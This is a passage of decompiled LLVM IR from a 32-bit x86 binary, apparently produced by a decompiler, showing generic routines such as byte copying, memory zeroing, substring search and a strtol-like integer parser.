dec_label_pc_8051ce3:                             ; preds = %dec_label_pc_8051cf4, %dec_label_pc_8051cdd, %dec_label_pc_8051ce3.dec_label_pc_8051ce3_crit_edge
  %v2_8051ce6 = phi i32 [ %v1_8051ce9, %dec_label_pc_8051ce3.dec_label_pc_8051ce3_crit_edge ], [ %v4_8051cc6, %dec_label_pc_8051cdd ], [ %v4_8051cc6, %dec_label_pc_8051cf4 ]
  %v0_8051ce5 = phi i32 [ %v0_8051cea, %dec_label_pc_8051ce3.dec_label_pc_8051ce3_crit_edge ], [ %v1_8051cd1, %dec_label_pc_8051cdd ], [ 0, %dec_label_pc_8051cf4 ]
  %v4_8051ce3 = phi i32 [ %v4_8051ce3.pre, %dec_label_pc_8051ce3.dec_label_pc_8051ce3_crit_edge ], [ %arg2, %dec_label_pc_8051cdd ], [ %arg2, %dec_label_pc_8051cf4 ]
  %v0_8051ce3 = phi i32 [ %v1_8051ce8, %dec_label_pc_8051ce3.dec_label_pc_8051ce3_crit_edge ], [ %arg2, %dec_label_pc_8051cdd ], [ %arg2, %dec_label_pc_8051cf4 ]
  %v1_8051ce3 = inttoptr i32 %v0_8051ce3 to i8*
  %v2_8051ce3 = load i8, i8* %v1_8051ce3, align 1
  %v3_8051ce3 = zext i8 %v2_8051ce3 to i32
  %v5_8051ce3 = and i32 %v4_8051ce3, -256
  %v6_8051ce3 = or i32 %v3_8051ce3, %v5_8051ce3
  store i32 %v6_8051ce3, i32* %eax.global-to-local, align 4
  %v1_8051ce5 = add i32 %v0_8051ce5, -1
  store i32 %v1_8051ce5, i32* %edx.global-to-local, align 4
  %v3_8051ce6 = inttoptr i32 %v2_8051ce6 to i8*
  store i8 %v2_8051ce3, i8* %v3_8051ce6, align 1
  %v0_8051ce8 = load i32, i32* @ecx, align 4
  %v1_8051ce8 = add i32 %v0_8051ce8, 1
  store i32 %v1_8051ce8, i32* @ecx, align 4
  %v0_8051ce9 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8051ce9 = add i32 %v0_8051ce9, 1
  store i32 %v1_8051ce9, i32* %ebx.global-to-local, align 4
  %v0_8051cea = load i32, i32* %edx.global-to-local, align 4
  %v10_8051cea = icmp eq i32 %v0_8051cea, -1
  %v1_8051ced = icmp eq i1 %v10_8051cea, false
  br i1 %v1_8051ced, label %dec_label_pc_8051ce3.dec_label_pc_8051ce3_crit_edge, label %dec_label_pc_8051cef.loopexit

dec_label_pc_8051ce3.dec_label_pc_8051ce3_crit_edge: ; preds = %dec_label_pc_8051ce3
  %v4_8051ce3.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8051ce3

dec_label_pc_8051cef.loopexit:                    ; preds = %dec_label_pc_8051ce3
  %v0_8051cef.pre = load i32, i32* %esi.global-to-local, align 4
  %v2_8051cf1.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_8051cef

dec_label_pc_8051cef:                             ; preds = %dec_label_pc_8051cef.loopexit, %dec_label_pc_8051cd8
  %v2_8051cf1 = phi i32 [ %v2_8051cf1.pre, %dec_label_pc_8051cef.loopexit ], [ %v0_8051cc1, %dec_label_pc_8051cd8 ]
  %v0_8051cef = phi i32 [ %v0_8051cef.pre, %dec_label_pc_8051cef.loopexit ], [ %v1_8051cd1, %dec_label_pc_8051cd8 ]
  store i32 %v0_8051cef, i32* %eax.global-to-local, align 4
  store i32 %v2_8051cf1, i32* @ebx, align 4
  ret i32 %v0_8051cef

dec_label_pc_8051cf4:                             ; preds = %dec_label_pc_8051cc0
  store i32 %v4_8051cc6, i32* %ebx.global-to-local, align 4
  store i32 %arg2, i32* @ecx, align 4
  store i32 0, i32* %edx.global-to-local, align 4
  store i32 0, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_8051ce3

; uselistorder directives
  uselistorder i32 %v0_8051cef, { 1, 0 }
  uselistorder i32 %v1_8051ce9, { 1, 0 }
  uselistorder i32 %v1_8051ce8, { 1, 0 }
  uselistorder i32 %v1_8051cd1, { 1, 0, 2, 3, 5, 4 }
  uselistorder i32 %v4_8051cc6, { 2, 0, 1, 3, 4 }
  uselistorder i32* %eax.global-to-local, { 2, 0, 1, 3 }
  uselistorder i32 %arg2, { 5, 0, 1, 2, 3, 6, 4, 7, 8 }
  uselistorder label %dec_label_pc_8051ce3, { 0, 2, 1 }
}

define i32 @function_8051d00(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_8051d00:
  %ebx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_8051d01 = load i32, i32* @ebx, align 4
  store i32 %v0_8051d01, i32* %stack_var_-8, align 4
  store i32 %arg1, i32* %esi.global-to-local, align 4
  store i32 %arg2, i32* %ebx.global-to-local, align 4
  %v1_8051d0e = icmp eq i32 %arg3, 0
  br i1 %v1_8051d0e, label %dec_label_pc_8051d1f, label %dec_label_pc_8051d12

dec_label_pc_8051d12:                             ; preds = %dec_label_pc_8051d00
  store i32 0, i32* %edx.global-to-local, align 4
  %v3_8051d1411 = inttoptr i32 %arg2 to i8*
  %v4_8051d1412 = load i8, i8* %v3_8051d1411, align 1
  %v6_8051d1714 = inttoptr i32 %arg1 to i8*
  store i8 %v4_8051d1412, i8* %v6_8051d1714, align 1
  %v0_8051d1a15 = load i32, i32* %edx.global-to-local, align 4
  %v1_8051d1a16 = add i32 %v0_8051d1a15, 1
  store i32 %v1_8051d1a16, i32* %edx.global-to-local, align 4
  %v12_8051d1b17 = icmp eq i32 %v1_8051d1a16, %arg3
  %v1_8051d1d18 = icmp eq i1 %v12_8051d1b17, false
  br i1 %v1_8051d1d18, label %dec_label_pc_8051d14.dec_label_pc_8051d14_crit_edge, label %dec_label_pc_8051d1f.loopexit

dec_label_pc_8051d14.dec_label_pc_8051d14_crit_edge: ; preds = %dec_label_pc_8051d12, %dec_label_pc_8051d14.dec_label_pc_8051d14_crit_edge
  %v1_8051d1a20 = phi i32 [ %v1_8051d1a, %dec_label_pc_8051d14.dec_label_pc_8051d14_crit_edge ], [ %v1_8051d1a16, %dec_label_pc_8051d12 ]
  %v1_8051d14.pre = load i32, i32* %ebx.global-to-local, align 4
  %v4_8051d17.pre = load i32, i32* %esi.global-to-local, align 4
  %v2_8051d14 = add i32 %v1_8051d1a20, %v1_8051d14.pre
  %v3_8051d14 = inttoptr i32 %v2_8051d14 to i8*
  %v4_8051d14 = load i8, i8* %v3_8051d14, align 1
  %v5_8051d17 = add i32 %v1_8051d1a20, %v4_8051d17.pre
  %v6_8051d17 = inttoptr i32 %v5_8051d17 to i8*
  store i8 %v4_8051d14, i8* %v6_8051d17, align 1
  %v0_8051d1a = load i32, i32* %edx.global-to-local, align 4
  %v1_8051d1a = add i32 %v0_8051d1a, 1
  store i32 %v1_8051d1a, i32* %edx.global-to-local, align 4
  %v12_8051d1b = icmp eq i32 %v1_8051d1a, %arg3
  %v1_8051d1d = icmp eq i1 %v12_8051d1b, false
  br i1 %v1_8051d1d, label %dec_label_pc_8051d14.dec_label_pc_8051d14_crit_edge, label %dec_label_pc_8051d1f.loopexit

dec_label_pc_8051d1f.loopexit:                    ; preds = %dec_label_pc_8051d14.dec_label_pc_8051d14_crit_edge, %dec_label_pc_8051d12
  %v4_8051d14.lcssa = phi i8 [ %v4_8051d1412, %dec_label_pc_8051d12 ], [ %v4_8051d14, %dec_label_pc_8051d14.dec_label_pc_8051d14_crit_edge ]
  %phitmp = sext i8 %v4_8051d14.lcssa to i32
  %v2_8051d1f.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_8051d1f

dec_label_pc_8051d1f:                             ; preds = %dec_label_pc_8051d1f.loopexit, %dec_label_pc_8051d00
  %v2_8051d1f = phi i32 [ %v0_8051d01, %dec_label_pc_8051d00 ], [ %v2_8051d1f.pre, %dec_label_pc_8051d1f.loopexit ]
  %.1 = phi i32 [ 0, %dec_label_pc_8051d00 ], [ %phitmp, %dec_label_pc_8051d1f.loopexit ]
  store i32 %v2_8051d1f, i32* @ebx, align 4
  ret i32 %.1

; uselistorder directives
  uselistorder i32 %v1_8051d1a, { 1, 2, 0 }
  uselistorder i32 %v1_8051d1a20, { 1, 0 }
  uselistorder i32* %edx.global-to-local, { 0, 3, 4, 1, 2 }
  uselistorder i32 %arg3, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8051d14.dec_label_pc_8051d14_crit_edge, { 1, 0 }
}

define i32 @function_8051d30(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_8051d30:
  %eax.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %ecx.global-to-local, align 4
  %v1_8051d38 = icmp eq i32 %arg2, 0
  br i1 %v1_8051d38, label %dec_label_pc_8051d30.dec_label_pc_8051d49_crit_edge, label %dec_label_pc_8051d3c

dec_label_pc_8051d30.dec_label_pc_8051d49_crit_edge: ; preds = %dec_label_pc_8051d30
  %v0_8051d49.pre = load i32, i32* @eax, align 4
  br label %dec_label_pc_8051d49

dec_label_pc_8051d3c:                             ; preds = %dec_label_pc_8051d30
  store i32 0, i32* %eax.global-to-local, align 4
  %v3_8051d405 = inttoptr i32 %arg1 to i8*
  store i8 0, i8* %v3_8051d405, align 1
  %v0_8051d446 = load i32, i32* %eax.global-to-local, align 4
  %v1_8051d447 = add i32 %v0_8051d446, 1
  store i32 %v1_8051d447, i32* %eax.global-to-local, align 4
  %v12_8051d458 = icmp eq i32 %v1_8051d447, %arg2
  %v1_8051d479 = icmp eq i1 %v12_8051d458, false
  br i1 %v1_8051d479, label %dec_label_pc_8051d40.dec_label_pc_8051d40_crit_edge, label %dec_label_pc_8051d49

dec_label_pc_8051d40.dec_label_pc_8051d40_crit_edge: ; preds = %dec_label_pc_8051d3c, %dec_label_pc_8051d40.dec_label_pc_8051d40_crit_edge
  %v1_8051d4410 = phi i32 [ %v1_8051d44, %dec_label_pc_8051d40.dec_label_pc_8051d40_crit_edge ], [ %v1_8051d447, %dec_label_pc_8051d3c ]
  %v1_8051d40.pre = load i32, i32* %ecx.global-to-local, align 4
  %v2_8051d40 = add i32 %v1_8051d4410, %v1_8051d40.pre
  %v3_8051d40 = inttoptr i32 %v2_8051d40 to i8*
  store i8 0, i8* %v3_8051d40, align 1
  %v0_8051d44 = load i32, i32* %eax.global-to-local, align 4
  %v1_8051d44 = add i32 %v0_8051d44, 1
  store i32 %v1_8051d44, i32* %eax.global-to-local, align 4
  %v12_8051d45 = icmp eq i32 %v1_8051d44, %arg2
  %v1_8051d47 = icmp eq i1 %v12_8051d45, false
  br i1 %v1_8051d47, label %dec_label_pc_8051d40.dec_label_pc_8051d40_crit_edge, label %dec_label_pc_8051d49

dec_label_pc_8051d49:                             ; preds = %dec_label_pc_8051d3c, %dec_label_pc_8051d40.dec_label_pc_8051d40_crit_edge, %dec_label_pc_8051d30.dec_label_pc_8051d49_crit_edge
  %v0_8051d49 = phi i32 [ %v0_8051d49.pre, %dec_label_pc_8051d30.dec_label_pc_8051d49_crit_edge ], [ %v1_8051d447, %dec_label_pc_8051d3c ], [ %v1_8051d44, %dec_label_pc_8051d40.dec_label_pc_8051d40_crit_edge ]
  ret i32 %v0_8051d49

; uselistorder directives
  uselistorder i32 %v1_8051d44, { 0, 2, 3, 1 }
  uselistorder i32* %eax.global-to-local, { 0, 3, 4, 1, 2 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8051d49, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8051d40.dec_label_pc_8051d40_crit_edge, { 1, 0 }
}

define i32 @function_8051d50() local_unnamed_addr {
dec_label_pc_8051d50:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp8 = call i32 @__decompiler_undefined_function_0()
  %tmp9 = call i32 @__decompiler_undefined_function_0()
  %tmp10 = call i32 @__decompiler_undefined_function_0()
  store i32 %tmp10, i32* @ecx, align 4
  %v7_8051d65 = icmp sgt i32 %tmp9, %tmp10
  br i1 %v7_8051d65, label %dec_label_pc_8051d67, label %dec_label_pc_8051d70

dec_label_pc_8051d67:                             ; preds = %dec_label_pc_8051d82, %dec_label_pc_8051d50, %dec_label_pc_8051d70
  br label %dec_label_pc_8051d6a

dec_label_pc_8051d6a:                             ; preds = %dec_label_pc_8051d95, %dec_label_pc_8051d67
  %storemerge = phi i32 [ -1, %dec_label_pc_8051d67 ], [ %v0_8051d83, %dec_label_pc_8051d95 ]
  ret i32 %storemerge

dec_label_pc_8051d70:                             ; preds = %dec_label_pc_8051d50
  %tmp17 = icmp slt i32 %tmp10, 1
  br i1 %tmp17, label %dec_label_pc_8051d67, label %dec_label_pc_8051d74

dec_label_pc_8051d74:                             ; preds = %dec_label_pc_8051d70
  %v2_8051d8c = add i32 %tmp, -1
  br label %dec_label_pc_8051d88

dec_label_pc_8051d80:                             ; preds = %dec_label_pc_8051d88
  br label %dec_label_pc_8051d82

dec_label_pc_8051d82:                             ; preds = %dec_label_pc_8051d95, %dec_label_pc_8051d80
  %v2_8051d903 = phi i32 [ %v1_8051d95, %dec_label_pc_8051d95 ], [ 0, %dec_label_pc_8051d80 ]
  %v1_8051d82 = add i32 %v0_8051d82, 1
  %v1_8051d83 = add i32 %v0_8051d83, 1
  %v12_8051d84 = icmp eq i32 %tmp10, %v1_8051d82
  br i1 %v12_8051d84, label %dec_label_pc_8051d67, label %dec_label_pc_8051d88

dec_label_pc_8051d88:                             ; preds = %dec_label_pc_8051d82, %dec_label_pc_8051d74
  %v0_8051d82 = phi i32 [ %v1_8051d82, %dec_label_pc_8051d82 ], [ 0, %dec_label_pc_8051d74 ]
  %v0_8051d95 = phi i32 [ %v2_8051d903, %dec_label_pc_8051d82 ], [ 0, %dec_label_pc_8051d74 ]
  %v0_8051d83 = phi i32 [ %v1_8051d83, %dec_label_pc_8051d82 ], [ 1, %dec_label_pc_8051d74 ]
  %v3_8051d8c = add i32 %v2_8051d8c, %v0_8051d83
  %v4_8051d8c = inttoptr i32 %v3_8051d8c to i8*
  %v5_8051d8c = load i8, i8* %v4_8051d8c, align 1
  %v4_8051d90 = add i32 %v0_8051d95, %tmp8
  %v5_8051d90 = inttoptr i32 %v4_8051d90 to i8*
  %v6_8051d90 = load i8, i8* %v5_8051d90, align 1
  %v17_8051d90 = icmp eq i8 %v5_8051d8c, %v6_8051d90
  %v1_8051d93 = icmp eq i1 %v17_8051d90, false
  br i1 %v1_8051d93, label %dec_label_pc_8051d80, label %dec_label_pc_8051d95

dec_label_pc_8051d95:                             ; preds = %dec_label_pc_8051d88
  %v1_8051d95 = add i32 %v0_8051d95, 1
  %v12_8051d96 = icmp eq i32 %tmp9, %v1_8051d95
  %v1_8051d98 = icmp eq i1 %v12_8051d96, false
  br i1 %v1_8051d98, label %dec_label_pc_8051d82, label %dec_label_pc_8051d6a

; uselistorder directives
  uselistorder i32 %v0_8051d83, { 2, 0, 1 }
  uselistorder i32 %v0_8051d95, { 1, 0 }
  uselistorder i32 %v1_8051d82, { 1, 0 }
  uselistorder label %dec_label_pc_8051d67, { 0, 2, 1 }
}

define i32 @function_8051da0(i8* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_8051da0:
  %v4_8051da7 = ptrtoint i8* %arg1 to i32
  %v4_8051db0.pre = load i32, i32* @ecx, align 4
  br label %dec_label_pc_8051db0

dec_label_pc_8051db0:                             ; preds = %dec_label_pc_8051dc4, %dec_label_pc_8051dc0, %dec_label_pc_8051db0, %dec_label_pc_8051da0
  %v4_8051db0 = phi i32 [ %v4_8051db0.pre, %dec_label_pc_8051da0 ], [ %v6_8051db0, %dec_label_pc_8051db0 ], [ %v6_8051db0, %dec_label_pc_8051dc0 ], [ %v6_8051db0, %dec_label_pc_8051dc4 ]
  %v0_8051db2 = phi i32 [ %v4_8051da7, %dec_label_pc_8051da0 ], [ %v1_8051db2, %dec_label_pc_8051db0 ], [ %v1_8051db2, %dec_label_pc_8051dc0 ], [ %v1_8051db2, %dec_label_pc_8051dc4 ]
  %v1_8051db0 = inttoptr i32 %v0_8051db2 to i8*
  %v2_8051db0 = load i8, i8* %v1_8051db0, align 1
  %v3_8051db0 = zext i8 %v2_8051db0 to i32
  %v5_8051db0 = and i32 %v4_8051db0, -256
  %v6_8051db0 = or i32 %v3_8051db0, %v5_8051db0
  %v1_8051db2 = add i32 %v0_8051db2, 1
  %v7_8051dbc = icmp eq i8 %v2_8051db0, 32
  br i1 %v7_8051dbc, label %dec_label_pc_8051db0, label %dec_label_pc_8051dc0

dec_label_pc_8051dc0:                             ; preds = %dec_label_pc_8051db0
  %v10_8051dc0 = icmp eq i8 %v2_8051db0, 9
  br i1 %v10_8051dc0, label %dec_label_pc_8051db0, label %dec_label_pc_8051dc4

dec_label_pc_8051dc4:                             ; preds = %dec_label_pc_8051dc0
  %v10_8051dc4 = icmp eq i8 %v2_8051db0, 10
  br i1 %v10_8051dc4, label %dec_label_pc_8051db0, label %dec_label_pc_8051dc8

dec_label_pc_8051dc8:                             ; preds = %dec_label_pc_8051dc4
  %tmp41 = sext i32 %arg2 to i64
  %v10_8051dc8 = icmp eq i8 %v2_8051db0, 45
  br i1 %v10_8051dc8, label %dec_label_pc_8051e7d, label %dec_label_pc_8051dd1

dec_label_pc_8051dd1:                             ; preds = %dec_label_pc_8051dc8
  %v10_8051dd1 = icmp eq i8 %v2_8051db0, 43
  br i1 %v10_8051dd1, label %dec_label_pc_8051ead, label %dec_label_pc_8051dda

dec_label_pc_8051dda:                             ; preds = %dec_label_pc_8051dd1, %dec_label_pc_8051ead
  %v0_8051e2430 = phi i32 [ %v1_8051db2, %dec_label_pc_8051dd1 ], [ %v1_8051eb0, %dec_label_pc_8051ead ]
  %v0_8051e5016.in = phi i8 [ %v2_8051db0, %dec_label_pc_8051dd1 ], [ %v2_8051ead, %dec_label_pc_8051ead ]
  %v2_8051e2e9 = phi i8 [ %v2_8051db0, %dec_label_pc_8051dd1 ], [ %v2_8051ead, %dec_label_pc_8051ead ]
  br label %dec_label_pc_8051de7

dec_label_pc_8051de7:                             ; preds = %dec_label_pc_8051e7d, %dec_label_pc_8051dda
  %v0_8051e2429 = phi i32 [ %v1_8051e85, %dec_label_pc_8051e7d ], [ %v0_8051e2430, %dec_label_pc_8051dda ]
  %v0_8051e5015.in = phi i8 [ %v2_8051e7d, %dec_label_pc_8051e7d ], [ %v0_8051e5016.in, %dec_label_pc_8051dda ]
  %v2_8051e2e8 = phi i8 [ %v2_8051e7d, %dec_label_pc_8051e7d ], [ %v2_8051e2e9, %dec_label_pc_8051dda ]
  %v0_8051de7 = phi i64 [ 2147483648, %dec_label_pc_8051e7d ], [ 2147483647, %dec_label_pc_8051dda ]
  %stack_var_-20.0 = phi i32 [ 1, %dec_label_pc_8051e7d ], [ 0, %dec_label_pc_8051dda ]
  %v12_8051deb = udiv i64 %v0_8051de7, %tmp41
  %v13_8051deb = trunc i64 %v12_8051deb to i32
  %v14_8051deb = urem i64 %v0_8051de7, %tmp41
  %v15_8051deb = trunc i64 %v14_8051deb to i32
  br label %dec_label_pc_8051e2e

dec_label_pc_8051e00:                             ; preds = %dec_label_pc_8051e2e
  %v1_8051e00 = add nsw i32 %v0_8051e00, -48
  %v7_8051e07 = icmp slt i32 %v1_8051e00, %arg2
  br i1 %v7_8051e07, label %dec_label_pc_8051e09, label %dec_label_pc_8051e5a

dec_label_pc_8051e09:                             ; preds = %dec_label_pc_8051e00, %dec_label_pc_8051e50
  %v1_8051e21 = phi i32 [ %v1_8051e00, %dec_label_pc_8051e00 ], [ %v2_8051e52, %dec_label_pc_8051e50 ]
  %v2_8051e09 = icmp slt i32 %v0_8051e09, 0
  br i1 %v2_8051e09, label %dec_label_pc_8051e78, label %dec_label_pc_8051e0d

dec_label_pc_8051e0d:                             ; preds = %dec_label_pc_8051e09
  %tmp42 = icmp ugt i32 %v0_8051e0d, %v13_8051deb
  br i1 %tmp42, label %dec_label_pc_8051e78, label %dec_label_pc_8051e13

dec_label_pc_8051e13:                             ; preds = %dec_label_pc_8051e0d
  %v15_8051e0d = icmp eq i32 %v0_8051e0d, %v13_8051deb
  br i1 %v15_8051e0d, label %dec_label_pc_8051e72, label %dec_label_pc_8051e15

dec_label_pc_8051e15:                             ; preds = %dec_label_pc_8051e72, %dec_label_pc_8051e13
  %v4_8051e1e = mul i32 %v1_8051e1e, %arg2
  %v2_8051e21 = add i32 %v1_8051e21, %v4_8051e1e
  br label %dec_label_pc_8051e24

dec_label_pc_8051e24:                             ; preds = %dec_label_pc_8051e78, %dec_label_pc_8051e15
  %v1_8051e1e26 = phi i32 [ %v1_8051e1e, %dec_label_pc_8051e78 ], [ %v2_8051e21, %dec_label_pc_8051e15 ]
  %v0_8051e6220 = phi i32 [ %v0_8051e0d, %dec_label_pc_8051e78 ], [ %v2_8051e21, %dec_label_pc_8051e15 ]
  %v0_8051e5a19 = phi i32 [ -1, %dec_label_pc_8051e78 ], [ 1, %dec_label_pc_8051e15 ]
  %v1_8051e24 = inttoptr i32 %v0_8051e24 to i8*
  %v2_8051e24 = load i8, i8* %v1_8051e24, align 1
  %v1_8051e2a = add i32 %v0_8051e24, 1
  br label %dec_label_pc_8051e2e

dec_label_pc_8051e2e:                             ; preds = %dec_label_pc_8051de7, %dec_label_pc_8051e24
  %v0_8051e24 = phi i32 [ %v0_8051e2429, %dec_label_pc_8051de7 ], [ %v1_8051e2a, %dec_label_pc_8051e24 ]
  %v1_8051e1e = phi i32 [ 0, %dec_label_pc_8051de7 ], [ %v1_8051e1e26, %dec_label_pc_8051e24 ]
  %v0_8051e0d = phi i32 [ 0, %dec_label_pc_8051de7 ], [ %v0_8051e6220, %dec_label_pc_8051e24 ]
  %v0_8051e09 = phi i32 [ 0, %dec_label_pc_8051de7 ], [ %v0_8051e5a19, %dec_label_pc_8051e24 ]
  %v0_8051e00.in = phi i8 [ %v0_8051e5015.in, %dec_label_pc_8051de7 ], [ %v2_8051e24, %dec_label_pc_8051e24 ]
  %v2_8051e2e = phi i8 [ %v2_8051e2e8, %dec_label_pc_8051de7 ], [ %v2_8051e24, %dec_label_pc_8051e24 ]
  %v0_8051e00 = sext i8 %v0_8051e00.in to i32
  %v1_8051e31 = add i8 %v2_8051e2e, -48
  %tmp43 = icmp ult i8 %v1_8051e31, 10
  br i1 %tmp43, label %dec_label_pc_8051e00, label %dec_label_pc_8051e38

dec_label_pc_8051e38:                             ; preds = %dec_label_pc_8051e2e
  %v1_8051e38 = add i8 %v2_8051e2e, -65
  store i32 55, i32* @ecx, align 4
  %tmp44 = icmp ult i8 %v1_8051e38, 26
  br i1 %tmp44, label %dec_label_pc_8051e50, label %dec_label_pc_8051e44

dec_label_pc_8051e44:                             ; preds = %dec_label_pc_8051e38
  %v1_8051e44 = add i8 %v2_8051e2e, -97
  %tmp45 = icmp ult i8 %v1_8051e44, 26
  br i1 %tmp45, label %dec_label_pc_8051e4b, label %dec_label_pc_8051e5a

dec_label_pc_8051e4b:                             ; preds = %dec_label_pc_8051e44
  store i32 87, i32* @ecx, align 4
  br label %dec_label_pc_8051e50

dec_label_pc_8051e50:                             ; preds = %dec_label_pc_8051e38, %dec_label_pc_8051e4b
  %v1_8051e52 = phi i32 [ 55, %dec_label_pc_8051e38 ], [ 87, %dec_label_pc_8051e4b ]
  %v2_8051e52 = sub nsw i32 %v0_8051e00, %v1_8051e52
  %v7_8051e58 = icmp slt i32 %v2_8051e52, %arg2
  br i1 %v7_8051e58, label %dec_label_pc_8051e09, label %dec_label_pc_8051e5a

dec_label_pc_8051e5a:                             ; preds = %dec_label_pc_8051e00, %dec_label_pc_8051e44, %dec_label_pc_8051e50
  %v2_8051e5a = icmp slt i32 %v0_8051e09, 0
  br i1 %v2_8051e5a, label %dec_label_pc_8051e99, label %dec_label_pc_8051e5e

dec_label_pc_8051e5e:                             ; preds = %dec_label_pc_8051e5a
  store i32 %stack_var_-20.0, i32* @ecx, align 4
  %v1_8051e64 = icmp eq i32 %stack_var_-20.0, 0
  br i1 %v1_8051e64, label %dec_label_pc_8051e6a, label %dec_label_pc_8051e68

dec_label_pc_8051e68:                             ; preds = %dec_label_pc_8051e5e
  %v1_8051e68 = sub i32 0, %v0_8051e0d
  br label %dec_label_pc_8051e6a

dec_label_pc_8051e6a:                             ; preds = %dec_label_pc_8051e5e, %dec_label_pc_8051e68
  %v0_8051e71 = phi i32 [ %v0_8051e0d, %dec_label_pc_8051e5e ], [ %v1_8051e68, %dec_label_pc_8051e68 ]
  ret i32 %v0_8051e71

dec_label_pc_8051e72:                             ; preds = %dec_label_pc_8051e13
  %v5_8051e72 = sub i32 %v1_8051e21, %v15_8051deb
  %v11_8051e72 = xor i32 %v1_8051e21, %v15_8051deb
  %v12_8051e72 = xor i32 %v5_8051e72, %v1_8051e21
  %v13_8051e72 = and i32 %v12_8051e72, %v11_8051e72
  %v14_8051e72 = icmp slt i32 %v13_8051e72, 0
  %v15_8051e72 = icmp eq i32 %v5_8051e72, 0
  %v16_8051e72 = icmp slt i32 %v5_8051e72, 0
  %v3_8051e76 = icmp ne i1 %v16_8051e72, %v14_8051e72
  %v4_8051e76 = or i1 %v15_8051e72, %v3_8051e76
  br i1 %v4_8051e76, label %dec_label_pc_8051e15, label %dec_label_pc_8051e78

dec_label_pc_8051e78:                             ; preds = %dec_label_pc_8051e0d, %dec_label_pc_8051e72, %dec_label_pc_8051e09
  br label %dec_label_pc_8051e24

dec_label_pc_8051e7d:                             ; preds = %dec_label_pc_8051dc8
  %v1_8051e7d = inttoptr i32 %v1_8051db2 to i8*
  %v2_8051e7d = load i8, i8* %v1_8051e7d, align 1
  %v1_8051e85 = add i32 %v0_8051db2, 2
  br label %dec_label_pc_8051de7

dec_label_pc_8051e99:                             ; preds = %dec_label_pc_8051e5a
  %v8_8051e99 = icmp eq i32 %stack_var_-20.0, 0
  %v2_8051e9e = zext i1 %v8_8051e99 to i32
  %v1_8051ea33 = or i32 %v2_8051e9e, -2147483648
  ret i32 %v1_8051ea33

dec_label_pc_8051ead:                             ; preds = %dec_label_pc_8051dd1
  %v1_8051ead = inttoptr i32 %v1_8051db2 to i8*
  %v2_8051ead = load i8, i8* %v1_8051ead, align 1
  %v1_8051eb0 = add i32 %v0_8051db2, 2
  br label %dec_label_pc_8051dda

; uselistorder directives
  uselistorder i32 %v5_8051e72, { 1, 2, 0 }
  uselistorder i32 %v2_8051e52, { 1, 0 }
  uselistorder i8 %v2_8051e24, { 1, 0 }
  uselistorder i32 %v2_8051e21, { 1, 0 }
  uselistorder i32 %v1_8051e21, { 0, 1, 3, 2 }
  uselistorder i32 %v13_8051deb, { 1, 0 }
  uselistorder i32 %v1_8051db2, { 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v6_8051db0, { 2, 1, 0 }
  uselistorder i8 %v2_8051db0, { 3, 0, 1, 2, 4, 5, 6, 7 }
  uselistorder i32 %v0_8051db2, { 1, 0, 2, 3 }
  uselistorder i8 9, { 0, 4, 6, 5, 1, 7, 2, 3 }
  uselistorder i32 %arg2, { 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_8051e78, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8051e6a, { 1, 0 }
  uselistorder label %dec_label_pc_8051e5a, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8051e50, { 1, 0 }
  uselistorder label %dec_label_pc_8051e2e, { 1, 0 }
  uselistorder label %dec_label_pc_8051e09, { 1, 0 }
  uselistorder label %dec_label_pc_8051dda, { 1, 0 }
}

define i32 @function_8051ec0(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_8051ec0:
  %ebp.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %v0_8051ec1 = load i32, i32* @edi, align 4
  %v0_8051ec3 = load i32, i32* @ebx, align 4
  store i32 0, i32* @ebx, align 4
  store i32 %arg1, i32* %esi.global-to-local, align 4
  store i32 %arg2, i32* %ebp.global-to-local, align 4
  store i32 %arg3, i32* @edi, align 4
  %v0_8051ed5.pre = load i32, i32* @eax, align 4
  br label %dec_label_pc_8051ed5

dec_label_pc_8051ed5:                             ; preds = %dec_label_pc_8051eed.dec_label_pc_8051ed5_crit_edge, %dec_label_pc_8051ec0
  %v0_8051edc = phi i32 [ %v0_8051edc.pre, %dec_label_pc_8051eed.dec_label_pc_8051ed5_crit_edge ], [ %arg3, %dec_label_pc_8051ec0 ]
  %v1_8051ed6 = phi i32 [ %v1_8051ee8, %dec_label_pc_8051eed.dec_label_pc_8051ed5_crit_edge ], [ 0, %dec_label_pc_8051ec0 ]
  %v0_8051ed6 = phi i32 [ %v1_8051eed, %dec_label_pc_8051eed.dec_label_pc_8051ed5_crit_edge ], [ %arg1, %dec_label_pc_8051ec0 ]
  %v0_8051ed5 = phi i32 [ %v1_8051ee5, %dec_label_pc_8051eed.dec_label_pc_8051ed5_crit_edge ], [ %v0_8051ed5.pre, %dec_label_pc_8051ec0 ]
  %v2_8051ed6 = add i32 %v0_8051ed6, %v1_8051ed6
  %v4_8051edd = inttoptr i32 %v2_8051ed6 to i32*
  %v5_8051edd = call i32 @function_80523dc(i32 %v0_8051edc, i32* %v4_8051edd, i32 1, i32 %v0_8051ed5)
  %v1_8051ee5 = add i32 %v5_8051edd, -1
  %v8_8051ee5 = icmp eq i32 %v1_8051ee5, 0
  %v1_8051ee6 = icmp eq i1 %v8_8051ee5, false
  %v0_8051ef4.pre = load i32, i32* @ebx, align 4
  br i1 %v1_8051ee6, label %dec_label_pc_8051ef4, label %dec_label_pc_8051ee8

dec_label_pc_8051ee8:                             ; preds = %dec_label_pc_8051ed5
  %v1_8051ee8 = add i32 %v0_8051ef4.pre, 1
